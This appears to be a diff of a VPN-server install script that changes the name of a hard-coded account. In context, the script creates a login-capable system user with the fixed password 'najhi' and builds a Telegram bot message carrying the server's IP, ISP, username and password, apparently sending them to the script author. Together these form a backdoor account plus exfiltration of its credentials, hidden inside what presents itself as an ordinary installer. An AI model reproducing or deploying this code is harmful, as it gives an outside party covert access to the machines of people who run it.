@@ -6,7 +6,7 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 userdel jame > /dev/null 2>&1
-Username="ilyass"
+Username="najhi"
 Password=najhi
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
@@ -19,7 +19,7 @@ URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installation VIP OVPN-Script
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <code>Name       :</code> <code>$Name</code>
-<code>Username   :</code> <code>ilyass</code>
+<code>Username   :</code> <code>najhi</code>
 <code>Password   :</code> <code>najhi</code>
 <code>IP Vps     :</code> <code>$MYIP</code>
 <code>IP Vps     :</code> <code>$ISP</code>
